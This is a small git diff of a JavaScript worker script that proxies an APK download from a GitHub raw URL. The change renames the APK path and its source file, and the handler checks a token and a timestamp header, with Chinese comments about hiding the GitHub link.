@@ -28,7 +28,7 @@ async function handleRequest(request) {
   }
 
   // 处理APK下载请求 - 添加验证和混淆
-  if (path === 'stripchat_flow_edit_sign_en.apk') {
+  if (path === 's1-x_flow_sign_en.apk') {
     // 添加下载验证
     const downloadToken = request.headers.get('x-download-token')
     const timestamp = request.headers.get('x-timestamp')
@@ -41,7 +41,7 @@ async function handleRequest(request) {
     
     try {
       // 使用代理方式获取APK，避免直接暴露GitHub链接
-      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/stripchat/main/stripchat_flow_edit_sign_en.apk')
+      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk')
       
       // 添加安全相关的响应头
       return new Response(response.body, {
